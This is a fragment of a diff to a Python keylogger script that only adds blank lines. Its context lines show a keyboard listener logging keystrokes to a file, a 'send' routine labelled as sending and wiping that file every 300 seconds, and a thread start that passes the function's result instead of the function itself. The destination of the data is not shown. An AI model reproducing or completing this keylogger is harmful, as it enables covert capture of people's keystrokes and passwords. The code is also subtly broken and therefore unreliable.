@@ -26,10 +26,18 @@ def on_press(key):
         file.write(log)
 
 
+
+
+
+
 def llistener():
     # Start the key listener
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
+
+
+
+
 
 
 #send content of file function
@@ -48,6 +56,17 @@ def send():
         con.truncate()
 
     time.sleep(300)
+
+
+
+
+
+
+
+
+
+
+
 
 
 thread1 = threading.Thread(target=llistener())
